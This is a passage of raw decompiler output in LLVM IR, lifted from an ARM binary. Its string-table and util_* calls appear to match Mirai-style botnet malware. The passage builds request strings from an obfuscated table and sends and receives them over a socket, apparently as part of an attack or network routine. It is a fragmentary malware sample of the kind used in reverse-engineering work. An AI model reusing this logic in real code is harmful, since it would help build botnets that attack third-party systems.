  %v3_8aac = icmp uge i32 %v6_81fc, %v1_8aac
  store i1 %v3_8aac, i1* %cpsr_c.global-to-local, align 1
  %v9_8aac = icmp eq i32 %v6_81fc, %v1_8aac
  store i1 %v9_8aac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8aac, label %dec_label_pc_8b84, label %dec_label_pc_8ab4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_88bc
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8ab8 = call i32 @table_unlock_val(i32 42)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ac0 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8ac4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8ac4, i32* %r1.global-to-local, align 4
  store i32 %v2_8ac0, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_8ad0 = inttoptr i32 %v0_8ac4 to i32*
  %v3_8ad0 = call i32 @table_retrieve_val(i32 42, i32* %v2_8ad0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v3_8ad0, i32* %r1.global-to-local, align 4
  %v1_8adc = load i32, i32* @r4, align 4
  %v2_8adc = add i32 %v1_8adc, %stack_var_-20860.0.ph
  store i32 %v2_8adc, i32* @r0, align 4
  %v2_8ae0 = inttoptr i32 %v2_8adc to i8*
  %v3_8ae0 = call i32 @util_strcpy(i8* %v2_8ae0, i32 %v3_8ad0)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8ae8 = call i32 @table_lock_val(i32 42)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8af0 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8af8 = add i32 %v2_8af0, %stack_var_-20860.0.ph
  store i32 %v2_8af8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  %v3_8b00 = inttoptr i32 %v2_8af8 to i8*
  %v4_8b00 = call i32 @util_strcpy(i8* %v3_8b00, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b08 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8b0c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8b0c, i32* %r1.global-to-local, align 4
  store i32 %v2_8b08, i32* %r4.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v2_8b18 = inttoptr i32 %v0_8b0c to i32*
  %v3_8b18 = call i32 @table_retrieve_val(i32 47, i32* %v2_8b18)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8b18, i32* %r1.global-to-local, align 4
  %v2_8b24 = add i32 %v2_8b08, %stack_var_-20860.0.ph
  store i32 %v2_8b24, i32* @r0, align 4
  %v2_8b28 = inttoptr i32 %v2_8b24 to i8*
  %v3_8b28 = call i32 @util_strcpy(i8* %v2_8b28, i32 %v3_8b18)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b30 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a780.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8b3c = add i32 %v2_8b30, %stack_var_-20860.0.ph
  store i32 %v2_8b3c, i32* @r0, align 4
  %v2_8b40 = inttoptr i32 %v2_8b3c to i8*
  %v3_8b40 = call i32 @util_strcpy(i8* %v2_8b40, i32 ptrtoint (i32* @global_var_1a780.37 to i32))
  store i32 %v6_81fc, i32* %r0.global-to-local, align 4
  %v2_8b48 = call i32 @util_strlen(i8* %v1_8b48)
  store i32 %v2_8b48, i32* @r4, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b54 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8b60 = add i32 %v2_8b54, %stack_var_-20860.0.ph
  store i32 %v2_8b60, i32* %r2.global-to-local, align 4
  %v0_8b64 = load i32, i32* @r4, align 4
  store i32 %v0_8b64, i32* %r0.global-to-local, align 4
  %v3_8b68 = trunc i32 %v0_8b64 to i8
  %v4_8b68 = call i32 @util_itoa(i8 %v3_8b68, i32 10, i32 %v2_8b60)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b70 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8b7c = add i32 %v2_8b70, %stack_var_-20860.0.ph
  store i32 %v2_8b7c, i32* @r0, align 4
  %v3_8b80 = inttoptr i32 %v2_8b7c to i8*
  %v4_8b80 = call i32 @util_strcpy(i8* %v3_8b80, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32))
  store i32 %v4_8b80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8b84

dec_label_pc_8b84:                                ; preds = %dec_label_pc_88bc, %dec_label_pc_8ab4
  %v0_8b84 = load i32, i32* @r6, align 4
  %v1_8b84 = add i32 %v0_8b84, 16
  %v2_8b84 = inttoptr i32 %v1_8b84 to i32*
  %v3_8b84 = load i32, i32* %v2_8b84, align 4
  store i32 %v3_8b84, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b88 = icmp eq i32 %v3_8b84, 0
  store i1 %v2_8b88, i1* %cpsr_z.global-to-local, align 1
  %tmp177 = icmp slt i32 %v3_8b84, 1
  br i1 %tmp177, label %dec_label_pc_8c30, label %dec_label_pc_8b90

dec_label_pc_8b90:                                ; preds = %dec_label_pc_8b84
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b94 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8b9c = add i32 %v2_8b94, %stack_var_-20860.0.ph
  store i32 %v2_8b9c, i32* @r0, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a790.45 to i32), i32* %r1.global-to-local, align 4
  %v3_8ba4 = inttoptr i32 %v2_8b9c to i8*
  %v4_8ba4 = call i32 @util_strcpy(i8* %v3_8ba4, i32 ptrtoint ([9 x i8]* @global_var_1a790.45 to i32))
  store i32 %v4_8ba4, i32* %r0.global-to-local, align 4
  %v0_8ba8 = load i32, i32* @r6, align 4
  %v1_8ba8 = add i32 %v0_8ba8, 16
  %v2_8ba8 = inttoptr i32 %v1_8ba8 to i32*
  %v3_8ba8 = load i32, i32* %v2_8ba8, align 4
  store i32 %v3_8ba8, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8bb0 = icmp eq i32 %v3_8ba8, 0
  store i1 %v2_8bb0, i1* %cpsr_z.global-to-local, align 1
  %v0_8bb4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8bb4, i32* %stack_var_-44, align 4
  %tmp178 = icmp slt i32 %v3_8ba8, 1
  br i1 %tmp178, label %dec_label_pc_8c18, label %dec_label_pc_8bbc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8b90, %dec_label_pc_8bbc
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bc0 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_8bc8 = load i32, i32* %stack_var_-44, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_8bd0 = and i32 %v3_8bc8, 33554432
  %v2_8bd0 = icmp ne i32 %v1_8bd0, 0
  store i1 %v2_8bd0, i1* %cpsr_c.global-to-local, align 1
  %v3_8bd0 = mul i32 %v3_8bc8, 128
  %v1_8bd4 = add i32 %v3_8bd0, 1472
  %v2_8bd8 = add i32 %v2_8bc0, %stack_var_-20860.0.ph
  store i32 %v2_8bd8, i32* @r0, align 4
  %v0_8bdc = load i32, i32* @r5, align 4
  %v2_8bdc = add i32 %v1_8bd4, %v0_8bdc
  store i32 %v2_8bdc, i32* %r1.global-to-local, align 4
  %v2_8be0 = inttoptr i32 %v2_8bd8 to i8*
  %v3_8be0 = call i32 @util_strcpy(i8* %v2_8be0, i32 %v2_8bdc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8be8 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a79c.47 to i32), i32* %r1.global-to-local, align 4
  %v2_8bf4 = add i32 %v2_8be8, %stack_var_-20860.0.ph
  store i32 %v2_8bf4, i32* @r0, align 4
  %v3_8bf8 = inttoptr i32 %v2_8bf4 to i8*
  %v4_8bf8 = call i32 @util_strcpy(i8* %v3_8bf8, i32 ptrtoint ([3 x i8]* @global_var_1a79c.47 to i32))
  store i32 %v4_8bf8, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8c00 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c00, i32* %r3.global-to-local, align 4
  %v0_8c04 = load i32, i32* @r6, align 4
  %v1_8c04 = add i32 %v0_8c04, 16
  %v2_8c04 = inttoptr i32 %v1_8c04 to i32*
  %v3_8c04 = load i32, i32* %v2_8c04, align 4
  store i32 %v3_8c04, i32* %r2.global-to-local, align 4
  %v1_8c08 = add i32 %v3_8c00, 1
  store i32 %v1_8c08, i32* %ip.global-to-local, align 4
  %v3_8c0c = icmp uge i32 %v3_8c04, %v1_8c08
  store i1 %v3_8c0c, i1* %cpsr_c.global-to-local, align 1
  %v9_8c0c = icmp eq i32 %v3_8c04, %v1_8c08
  store i1 %v9_8c0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8c08, i32* %stack_var_-44, align 4
  %v8_8c14 = icmp sgt i32 %v3_8c04, %v1_8c08
  br i1 %v8_8c14, label %dec_label_pc_8bbc, label %dec_label_pc_8c18

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8bbc, %dec_label_pc_8b90
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c1c = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8c28 = add i32 %v2_8c1c, %stack_var_-20860.0.ph
  store i32 %v2_8c28, i32* @r0, align 4
  %v3_8c2c = inttoptr i32 %v2_8c28 to i8*
  %v4_8c2c = call i32 @util_strcpy(i8* %v3_8c2c, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32))
  store i32 %v4_8c2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c30

dec_label_pc_8c30:                                ; preds = %dec_label_pc_8b84, %dec_label_pc_8c18
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c34 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8c40 = add i32 %v2_8c34, %stack_var_-20860.0.ph
  store i32 %v2_8c40, i32* @r0, align 4
  %v3_8c44 = inttoptr i32 %v2_8c40 to i8*
  %v4_8c44 = call i32 @util_strcpy(i8* %v3_8c44, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32))
  store i32 %v4_8c44, i32* %r0.global-to-local, align 4
  store i32 %v6_81fc, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_8c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c4c, label %dec_label_pc_8c6c, label %dec_label_pc_8c54

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c30
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c58 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v6_81fc, i32* %r1.global-to-local, align 4
  %v2_8c64 = add i32 %v2_8c58, %stack_var_-20860.0.ph
  store i32 %v2_8c64, i32* @r0, align 4
  %v2_8c68 = inttoptr i32 %v2_8c64 to i8*
  %v3_8c68 = call i32 @util_strcpy(i8* %v2_8c68, i32 %v6_81fc)
  store i32 %v3_8c68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c6c

dec_label_pc_8c6c:                                ; preds = %dec_label_pc_8c30, %dec_label_pc_8c54
  %v0_8c6c = load i32, i32* @r5, align 4
  %v1_8c6c = add i32 %v0_8c6c, 1440
  store i32 %v1_8c6c, i32* %r4.global-to-local, align 4
  %v0_8c70 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8c70, i32* %r0.global-to-local, align 4
  store i32 %v1_8c6c, i32* %r1.global-to-local, align 4
  %v2_8c78 = inttoptr i32 %v0_8c70 to i8*
  %v3_8c78 = call i32 @util_strcmp(i8* %v2_8c78, i32 %v1_8c6c)
  store i32 %v3_8c78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8c7c = icmp eq i32 %v3_8c78, 0
  store i1 %v2_8c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c7c, label %dec_label_pc_96bc, label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c6c, %dec_label_pc_96bc
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_8c88 = load i32, i32* @r6, align 4
  %v1_8c88 = add i32 %v0_8c88, -1452
  %v2_8c88 = inttoptr i32 %v1_8c88 to i32*
  %v3_8c88 = load i32, i32* %v2_8c88, align 4
  store i32 %v3_8c88, i32* @r4, align 4
  %v2_8c8c = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_8c8c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8c9c = load i32, i32* @r4, align 4
  store i32 %v0_8c9c, i32* %r0.global-to-local, align 4
  %v4_8ca0 = call i32 @__libc_send(i32 %v0_8c9c, i32 %stack_var_-20860.0.ph, i32 %v2_8c8c, i32 16384)
  store i32 %v4_8ca0, i32* %r0.global-to-local, align 4
  %v0_8ca4 = load i32, i32* @r6, align 4
  %v1_8ca4 = add i32 %v0_8ca4, -1452
  %v2_8ca4 = inttoptr i32 %v1_8ca4 to i32*
  %v3_8ca4 = load i32, i32* %v2_8ca4, align 4
  store i32 %v3_8ca4, i32* %ip.global-to-local, align 4
  %v3_8cac = udiv i32 %v3_8ca4, 32
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v3_8cb4 = mul nuw nsw i32 %v3_8cac, 4
  %v2_8cb8 = add i32 %v3_8cb4, %v2_8710
  store i32 %v2_8cb8, i32* %r2.global-to-local, align 4
  %v1_8cbc = add i32 %v2_8cb8, -164
  %v2_8cbc = inttoptr i32 %v1_8cbc to i32*
  %v3_8cbc = load i32, i32* %v2_8cbc, align 4
  %v1_8cc4 = urem i32 %v3_8ca4, 32
  store i32 %v1_8cc4, i32* %r0.global-to-local, align 4
  %v7_8cc8 = shl i32 1, %v1_8cc4
  %v8_8cc8 = or i32 %v3_8cbc, %v7_8cc8
  store i32 %v8_8cc8, i32* @r1, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v8_8cc8, i32* %v2_8cbc, align 4
  %v0_8cd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cd4 = trunc i32 %v0_8cd4 to i8
  %v2_8cd4 = load i32, i32* @r6, align 4
  %v3_8cd4 = add i32 %v2_8cd4, -1448
  %v4_8cd4 = inttoptr i32 %v3_8cd4 to i8*
  store i8 %v1_8cd4, i8* %v4_8cd4, align 1
  %v0_8cd8 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cd8 = load i32, i32* @r8, align 4
  %v2_8cd8 = sub i32 %v0_8cd8, %v1_8cd8
  %v3_8cd8 = icmp uge i32 %v0_8cd8, %v1_8cd8
  store i1 %v3_8cd8, i1* %cpsr_c.global-to-local, align 1
  %v4_8cd8 = xor i32 %v1_8cd8, %v0_8cd8
  %v5_8cd8 = xor i32 %v2_8cd8, %v0_8cd8
  %v6_8cd8 = and i32 %v5_8cd8, %v4_8cd8
  %v7_8cd8 = icmp slt i32 %v6_8cd8, 0
  %v8_8cd8 = icmp slt i32 %v2_8cd8, 0
  %v9_8cd8 = icmp eq i32 %v0_8cd8, %v1_8cd8
  store i1 %v9_8cd8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8530, i32* %r2.global-to-local, align 4
  %v3_8ce0 = xor i1 %v8_8cd8, %v7_8cd8
  %v4_8ce0 = or i1 %v9_8cd8, %v3_8ce0
  br i1 %v4_8ce0, label %bb180, label %bb179

bb179:                                            ; preds = %dec_label_pc_8c84
  %v6_8ce0 = add i32 %v0_8cd8, 1
  store i32 %v6_8ce0, i32* @r8, align 4
  br label %bb180

bb180:                                            ; preds = %dec_label_pc_8c84, %bb179
  %v1_8ce4 = load i32, i32* @r6, align 4
  %v2_8ce4 = add i32 %v1_8ce4, -1440
  %v3_8ce4 = inttoptr i32 %v2_8ce4 to i32*
  store i32 %v2_8530, i32* %v3_8ce4, align 4
  br label %dec_label_pc_85f4

dec_label_pc_8cec:                                ; preds = %dec_label_pc_85ac
  %v1_8cec = add i32 %v3_88b0, -1444
  %v2_8cec = inttoptr i32 %v1_8cec to i32*
  %v3_8cec = load i32, i32* %v2_8cec, align 4
  store i32 %v2_8530, i32* @r1, align 4
  %v2_8cf4 = sub i32 %v2_8530, %v3_8cec
  store i32 %v2_8cf4, i32* %r3.global-to-local, align 4
  %v2_8cf8 = icmp ugt i32 %v2_8cf4, 29
  store i1 %v2_8cf8, i1* %cpsr_c.global-to-local, align 1
  %v7_8cf8 = icmp eq i32 %v2_8cf4, 30
  store i1 %v7_8cf8, i1* %cpsr_z.global-to-local, align 1
  %v2_8cfc = xor i1 %v7_8cf8, true
  %v3_8cfc = and i1 %v2_8cf8, %v2_8cfc
  br i1 %v3_8cfc, label %dec_label_pc_85dc, label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8cec
  %v2_8d00 = inttoptr i32 %v1_8618 to i32*
  %v3_8d00 = load i32, i32* %v2_8d00, align 4
  store i32 %v3_8d00, i32* %ip.global-to-local, align 4
  %v3_8d08 = udiv i32 %v3_8d00, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8d0c = mul nuw nsw i32 %v3_8d08, 4
  store i32 %v3_8d0c, i32* %r2.global-to-local, align 4
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8718

dec_label_pc_8d1c:                                ; preds = %dec_label_pc_85bc
  %v2_8d1c = inttoptr i32 %v1_8618 to i32*
  %v3_8d1c = load i32, i32* %v2_8d1c, align 4
  store i32 %v3_8d1c, i32* %ip.global-to-local, align 4
  %v3_8d24 = udiv i32 %v3_8d1c, 32
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  %v3_8d2c = mul nuw nsw i32 %v3_8d24, 4
  %v2_8d30 = add i32 %v3_8d2c, %v2_8710
  store i32 %v2_8d30, i32* %r2.global-to-local, align 4
  %v1_8d34 = add i32 %v2_8d30, -164
  %v2_8d34 = inttoptr i32 %v1_8d34 to i32*
  %v3_8d34 = load i32, i32* %v2_8d34, align 4
  %v1_8d38 = urem i32 %v3_8d1c, 32
  store i32 %v1_8d38, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8d40 = shl i32 1, %v1_8d38
  %v8_8d40 = or i32 %v3_8d34, %v7_8d40
  store i32 %v8_8d40, i32* @r1, align 4
  %v1_8d44 = load i32, i32* @r8, align 4
  %v2_8d44 = sub i32 %v3_8d1c, %v1_8d44
  %v3_8d44 = icmp uge i32 %v3_8d1c, %v1_8d44
  store i1 %v3_8d44, i1* %cpsr_c.global-to-local, align 1
  %v4_8d44 = xor i32 %v1_8d44, %v3_8d1c
  %v5_8d44 = xor i32 %v2_8d44, %v3_8d1c
  %v6_8d44 = and i32 %v5_8d44, %v4_8d44
  %v7_8d44 = icmp slt i32 %v6_8d44, 0
  %v8_8d44 = icmp slt i32 %v2_8d44, 0
  %v9_8d44 = icmp eq i32 %v3_8d1c, %v1_8d44
  store i1 %v9_8d44, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d40, i32* %v2_8d34, align 4
  %v3_8d4c = xor i1 %v8_8d44, %v7_8d44
  %v4_8d4c = or i1 %v9_8d44, %v3_8d4c
  br i1 %v4_8d4c, label %dec_label_pc_85f4, label %dec_label_pc_8d50

dec_label_pc_8d50:                                ; preds = %dec_label_pc_8d1c
  %v0_8d50 = load i32, i32* %ip.global-to-local, align 4
  %v1_8d50 = load i32, i32* %r3.global-to-local, align 4
  %v2_8d50 = add i32 %v1_8d50, %v0_8d50
  store i32 %v2_8d50, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8d58:                                ; preds = %dec_label_pc_87dc
  %v0_8d58 = call i32 @__GI___errno_location()
  store i32 %v0_8d58, i32* %r0.global-to-local, align 4
  %v0_8d5c = load i32, i32* @sl, align 4
  %v1_8d5c = add i32 %v0_8d5c, 660
  %v2_8d5c = inttoptr i32 %v1_8d5c to i32*
  %v3_8d5c = load i32, i32* %v2_8d5c, align 4
  store i32 %v3_8d5c, i32* @r3, align 4
  %v0_8d60 = load i32, i32* %sb.global-to-local, align 4
  %v2_8d64 = icmp ugt i32 %v3_8d5c, 1023
  store i1 %v2_8d64, i1* %cpsr_c.global-to-local, align 1
  %v7_8d64 = icmp eq i32 %v3_8d5c, 1024
  store i1 %v7_8d64, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_8d58, i32* %fp.global-to-local, align 4
  %v1_8d6c = add i32 %v0_8d60, 2116
  store i32 %v1_8d6c, i32* @r7, align 4
  br i1 %v7_8d64, label %dec_label_pc_8e70, label %dec_label_pc_8d74

dec_label_pc_8d74:                                ; preds = %dec_label_pc_8d58, %dec_label_pc_8e70, %dec_label_pc_8e64
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8d78 = load i32, i32* %fp.global-to-local, align 4
  %v2_8d78 = inttoptr i32 %v1_8d78 to i32*
  store i32 0, i32* %v2_8d78, align 4
  %v0_8d7c = load i32, i32* @sl, align 4
  %v1_8d7c = add i32 %v0_8d7c, 660
  %v2_8d7c = inttoptr i32 %v1_8d7c to i32*
  %v3_8d7c = load i32, i32* %v2_8d7c, align 4
  store i32 %v3_8d7c, i32* %r1.global-to-local, align 4
  %v1_8d80 = add i32 %v0_8d7c, -1452
  %v2_8d80 = inttoptr i32 %v1_8d80 to i32*
  %v3_8d80 = load i32, i32* %v2_8d80, align 4
  store i32 %v3_8d80, i32* %r0.global-to-local, align 4
  %v1_8d84 = sub i32 1024, %v3_8d7c
  store i32 %v1_8d84, i32* %r2.global-to-local, align 4
  %v0_8d88 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d88 = add i32 %v0_8d88, 16384
  store i32 %v1_8d88, i32* %r3.global-to-local, align 4
  %v0_8d8c = load i32, i32* @r7, align 4
  %v2_8d8c = add i32 %v0_8d8c, %v3_8d7c
  store i32 %v2_8d8c, i32* %r1.global-to-local, align 4
  %v4_8d90 = call i32 @__libc_recv(i32 %v3_8d80, i32 %v2_8d8c, i32 %v1_8d84, i32 %v1_8d88)
  store i32 %v4_8d90, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8d94 = icmp eq i32 %v4_8d90, 0
  store i1 %v2_8d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d94, label %dec_label_pc_96cc, label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8d74
  %v2_8d9c = icmp eq i32 %v4_8d90, -1
  store i1 %v2_8d9c, i1* %cpsr_c.global-to-local, align 1
  %v7_8d9c = icmp eq i32 %v4_8d90, -1
  store i1 %v7_8d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d9c, label %dec_label_pc_96f0, label %dec_label_pc_8da4

dec_label_pc_8da4:                                ; preds = %dec_label_pc_8d9c
  %v0_8da4 = load i32, i32* @sl, align 4
  %v1_8da4 = add i32 %v0_8da4, 660
  %v2_8da4 = inttoptr i32 %v1_8da4 to i32*
  %v3_8da4 = load i32, i32* %v2_8da4, align 4
  store i32 %v2_879c, i32* %r1.global-to-local, align 4
  %v2_8dac = add i32 %v3_8da4, %v4_8d90
  store i32 %v2_8dac, i32* @r4, align 4
  store i32 %v2_8dac, i32* %v2_8da4, align 4
  %v0_8db4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8db4 = load i32, i32* @sl, align 4
  %v2_8db4 = add i32 %v1_8db4, -1444
  %v3_8db4 = inttoptr i32 %v2_8db4 to i32*
  store i32 %v0_8db4, i32* %v3_8db4, align 4
  br label %dec_label_pc_8e44

dec_label_pc_8dbc:                                ; preds = %dec_label_pc_8e44
  %v1_8dbc = inttoptr i32 %v0_8e44 to i32*
  %v2_8dbc = load i32, i32* %v1_8dbc, align 4
  store i32 %v2_8dbc, i32* @r8, align 4
  %v1_8dc0 = load i32, i32* @r4, align 4
  %v5_8dc4 = icmp slt i32 %v3_8e44, %v1_8dc0
  %storemerge49 = select i1 %v5_8dc4, i32 %v3_8e44, i32 %v1_8dc0
  store i32 %storemerge49, i32* @r6, align 4
  %v2_8dcc = sub i32 %v3_8e44, %storemerge49
  store i32 %v2_8dcc, i32* %r3.global-to-local, align 4
  %v2_8dd0 = icmp ne i32 %v2_8dbc, 0
  store i1 %v2_8dd0, i1* %cpsr_c.global-to-local, align 1
  %v7_8dd0 = icmp eq i32 %v2_8dbc, 1
  store i1 %v7_8dd0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8dcc, i32* %v2_8e44, align 4
  br i1 %v7_8dd0, label %dec_label_pc_8e94, label %.dec_label_pc_8de0thread-pre-split_crit_edge

.dec_label_pc_8de0thread-pre-split_crit_edge:     ; preds = %dec_label_pc_8dbc
  %v1_8dd8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_8dd8, i32* @r5, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8de0:                                ; preds = %dec_label_pc_8e50, %.dec_label_pc_8de0thread-pre-split_crit_edge, %dec_label_pc_8ebc
  %v0_8de0 = phi i32 [ %v3_8ebc, %dec_label_pc_8ebc ], [ %v1_8dd8, %.dec_label_pc_8de0thread-pre-split_crit_edge ], [ %v3_8e44, %dec_label_pc_8e50 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8de0 = icmp eq i32 %v0_8de0, 0
  store i1 %v2_8de0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8de0, label %dec_label_pc_8de8, label %dec_label_pc_8e08

dec_label_pc_8de8:                                ; preds = %dec_label_pc_8de0
  %v0_8de8 = load i32, i32* @sl, align 4
  %v1_8de8 = add i32 %v0_8de8, 8
  %v2_8de8 = inttoptr i32 %v1_8de8 to i32*
  %v3_8de8 = load i32, i32* %v2_8de8, align 4
  store i32 %v3_8de8, i32* @r4, align 4
  %v2_8dec = icmp ne i32 %v3_8de8, 0
  store i1 %v2_8dec, i1* %cpsr_c.global-to-local, align 1
  %v7_8dec = icmp eq i32 %v3_8de8, 1
  store i1 %v7_8dec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dec, label %dec_label_pc_8ec4, label %dec_label_pc_8df4

dec_label_pc_8df4:                                ; preds = %dec_label_pc_8de8
  %v1_8df4 = add i32 %v0_8de8, 660
  %v2_8df4 = inttoptr i32 %v1_8df4 to i32*
  %v3_8df4 = load i32, i32* %v2_8df4, align 4
  %v0_8df8 = load i32, i32* @r6, align 4
  %v2_8df8 = sub i32 %v3_8df4, %v0_8df8
  store i32 %v2_8df8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8dfc = icmp eq i32 %v2_8df8, 0
  store i1 %v2_8dfc, i1* %cpsr_z.global-to-local, align 1
  %v2_8e00 = add i32 %v0_8de8, 12
  %v3_8e00 = inttoptr i32 %v2_8e00 to i32*
  store i32 %v2_8df8, i32* %v3_8e00, align 4
  br i1 %v2_8dfc, label %dec_label_pc_96b0, label %dec_label_pc_8e08

dec_label_pc_8e08:                                ; preds = %dec_label_pc_8de0, %dec_label_pc_8ec4, %dec_label_pc_8df4, %dec_label_pc_8f4c
  %v0_8e08 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e08 = icmp eq i32 %v0_8e08, 0
  store i1 %v2_8e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e08, label %dec_label_pc_8e58, label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8e08
  %v0_8e10 = load i32, i32* @sl, align 4
  %v1_8e10 = add i32 %v0_8e10, 660
  %v2_8e10 = inttoptr i32 %v1_8e10 to i32*
  %v3_8e10 = load i32, i32* %v2_8e10, align 4
  store i32 %v3_8e10, i32* @r3, align 4
